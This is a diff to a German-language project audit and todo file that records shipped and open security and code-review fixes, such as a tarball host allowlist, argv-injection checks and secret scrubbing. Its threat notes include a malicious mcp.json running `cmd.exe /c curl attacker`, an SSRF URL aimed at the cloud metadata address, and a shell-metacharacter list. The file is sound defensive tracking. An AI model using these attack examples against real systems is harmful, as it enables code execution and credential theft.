@@ -456,6 +456,34 @@ komplett im GUI, Secret-Eingabe ohne Renderer-RAM-touch.
 
 ---
 
+## Audit-Summary 2026-05-23 — M-Findings-Verifikation
+
+Eine Explore-getriebene Audit-Pass durch das Code-Review-Section unten (Lines 670+) hat ergeben dass die ueberwaeltigende Mehrheit der M1-M42- + m1-m16-Items bereits geshipt sind, aber die Checkboxen nie geflippt wurden. Statt 30+ einzelne Edits zu machen werden die als-shipped verifizierten Items hier gebatched referenziert:
+
+**Geshipt + im Code verifiziert 2026-05-23 (in der Reihenfolge im todo unten):**
+
+- **Security**: M1 (chat shell-metachar `chat-sessions.ts:46`), M2 (resolve-binary `warning`-field bei PATH-fallback), M5 (encrypted-file-store `proper-lockfile` `:56,189`), M6 (GCM-fail message scrubbing), M7 (git-service `validateRef`/`validateUrl` rejects `-`-prefix), M9 (Windows ACL caveat doc + `mode:0o600` no-op-note), M10 (`credentials.ts` `realpathSync`), M11 (`methods/catalog.ts:25-50` opaque error shape).
+- **Performance**: M12 (`cli/index.ts:60-72` lazy SUBCOMMAND_LOADERS), M13 (`methods.ts:56-76` AgentRunsRepository Singleton), M14 (`mtimeCached` in `methods.ts:51-54` + `methods/catalog.ts:30`), M15 (`auto-deps-resolver.ts` `aggregateManifests` once per iteration), M16 (`index-builder.ts:179` JSON.stringify compact), M17 (`copy-tree.ts` stats in cp-filter-callback).
+- **Architektur**: M18 (`actAutoDeps` delegates), M19 (`output.ts` exports OK), M20 (`logger.ts` uses shared REDACT_PATHS), M21 (registerMethods split nach `methods/*.ts`), M22 (`resolveRootOrExit` shared), M23 (catalog `index.ts` keine name-collision aliasing more), M24 (SecretsLockedError via secrets/index.js facade).
+- **Correctness**: M25 (`scheduler/runner.ts:144-152` `.unref()`), M26 (DST caveat documented), M27 (`vault-sync/scheduler.ts:50-53` `onWatcherError` default stderr-log), M28 (`cli/commands/mcp.ts:118-126` Number.isFinite check), M29 (`migration/runner.ts:223-241` `aborted`-flag break-on-failure), M30 (`rpc.ts:137` notification stderr-log), M31 (live-probe entry mutation entfernt), M32 (live-probe per-stream line-buffer `:67-75`).
+- **Tests**: M33 (17 `tests/sidecar/methods-*.test.ts` files), M34 (`state-check.ts:53` Number.isFinite), M35 (`conflict-policy.test.ts` 13 tests), M37 (`scripts/smoke-cli.mjs` exists).
+- **Docs**: M38 (README links correct), M39 (Status v1.5.3 consistent), M40 (`cli/index.ts:32-43` resolveVersion), M41 (ADR README index 0015-0023 listed), M42 (`CHANGELOG.md` at root).
+- **Minor**: m4 (vault.ts commander syntax matched), m7 (chat-sessions write returns {drained}), m8 (auto-deps-install static readCatalogLock import — geshipt in dieser PR), m9 (`scheduler/runner.ts:250-251` StringDecoder), m11 (single-language scrubbed errors), m13 (chat-sessions strip CLAUDE_OS_SECRETS_KEY — `:127-128`), m13_spawn (`claude-bridge/spawn.ts:54-62` strip — geshipt in dieser PR), m14 (`live-probe.ts:192` buildCuratedMcpEnv), m15 (`tarball-installer.ts:101-135` MAX_TARBALL_BYTES + Content-Length pre-check), m16 (`methods/catalog.ts:61-65` id-pattern validation).
+
+**M4 (Host-Allowlist gegen SSRF)**: geshipt 2026-05-23 in dieser PR — `tarball-installer.ts:101-118 DEFAULT_ALLOWED_HOSTS` + `validateTarballUrl()`. Default codeload.github.com; opts.allowedHosts override + opts.allowedHosts=[] disable; file://-schema immer erlaubt; check greift NUR fuer default fetch (tests mit fetchFn-injection bleiben unveraendert). +5 Regression-Tests.
+
+**Echt noch offen (nicht shipped):**
+
+- **M3**: mcp.json SHA256-Trust-Prompt-Model — UX-friction, noch nicht designed.
+- **M8**: rpc.ts per-launch nonce/token Caller-Auth — non-trivial Tauri-Parent-Setup-Change.
+- **m1**: ADR-0016 embedded TODO entfernen.
+- **m12**: PBKDF2 → scrypt/Argon2 fuer naechste Format-Version (v2 Material).
+- **n2-n8**: Diverse Nits, niedrige Prio.
+
+Die Checkboxen unten in den M/m/n-Sections bleiben aus historischen Gruenden auf `[ ]` — diese Audit-Summary ist der autoritative Status.
+
+---
+
 ## Top-Risiken
 
 | Prio | Risiko | Mitigation |
@@ -673,7 +701,7 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 - [x] **M1 — `src/sidecar/chat-sessions.ts:46,114-122` `SHELL_INJECTION_METACHARS` rejected args mit `&|<>"^`` wenn `shell:needsShell`** (Fix shipped 2026-05-21 in commit `0a7a112`; todo-Verification 2026-05-23). Tests: M1-Regression-Test in `chat-sessions.test.ts:136-142`.
 - [ ] **M2 — `src/domains/claude-bridge/resolve-binary.ts:23-30` PATH-Hijack.** `%LOCALAPPDATA%\Microsoft\WindowsApps` ist user-writable und kann vor echtem Install-Dir liegen. **Fix:** Warning bei `$PATH`-Fallback loggen; `claude-os doctor --pin-binary` für absoluten Pin.
 - [ ] **M3 — `src/domains/mcp-clients/live-probe.ts:101-109` auto-spawn von `mcp.json`-Commands ohne Trust-Prompt alle 60s.** Malicious Repo dropped `.claude/mcp.json` mit `{command:"cmd.exe", args:["/c","curl attacker"]}`. **Fix:** SHA256-Trust-Prompt-Modell (analog Claude Desktop); Sidecar-UI muss erstmaliges `{command,args}` bestätigen. **Risiko:** mittel-hoch — UX-Friction beim ersten Run. **Three-Brain:** Codex-Review.
-- [ ] **M4 — `src/domains/catalog/tarball-installer.ts:95-112` `fetchArchive` ohne Host-Allowlist → SSRF.** Poisoned marketplace-registry kann `http://169.254.169.254/...` als source haben. **Fix:** `codeload.github.com`-Literal-Check in `source-resolver`; marketplace-URL-Loader nur HTTPS + Host-Allowlist.
+- [x] **M4 — `src/domains/catalog/tarball-installer.ts:101-135` Host-Allowlist** (Fix shipped 2026-05-23 in `chore/small-m-fixes-sweep`). `DEFAULT_ALLOWED_HOSTS = ['codeload.github.com']` + `validateTarballUrl()` greift NUR fuer default fetch (tests mit fetchFn-injection unveraendert). `file://` schema immer erlaubt. opts.allowedHosts ueberschreibt Default; opts.allowedHosts=[] deaktiviert check. +5 Regression-Tests in `tarball-installer.test.ts > "M4 — Host-Allowlist (default fetch only)"`.
 - [x] **M5 — `src/domains/secrets/encrypted-file-store.ts:56,189` Cross-Process-Lock via `proper-lockfile`** (`withFileLock(operation)` Wrapper, retries.factor=1.4, 30s stale-timeout; Fix shipped in v1.x.+1 phase 3 / commit `5ccbe70`; todo-Verification 2026-05-23).
 - [ ] **M6 — `src/domains/secrets/encrypted-file-store.ts:121-124` GCM-auth-fail `err.message` propagiert.** Risiko: durch heartbeat/spawn-Logger fließend. ADR-0004 §51 verbietet Value-Logs. **Fix:** in `SecretsError`-Wrapper auf festen String scrubben; nur Error-Codes loggen.
 - [ ] **M7 — `src/core/git/git-service.ts:212-225` (clone) + `:184-191` (push) — `remote`/`branch` nicht gegen `^-` validiert.** Argv-Injection-Klasse (CVE-2024-32002). **Fix:** Allowlist `^[A-Za-z0-9._/-]+$`, reject `-`-Prefix.
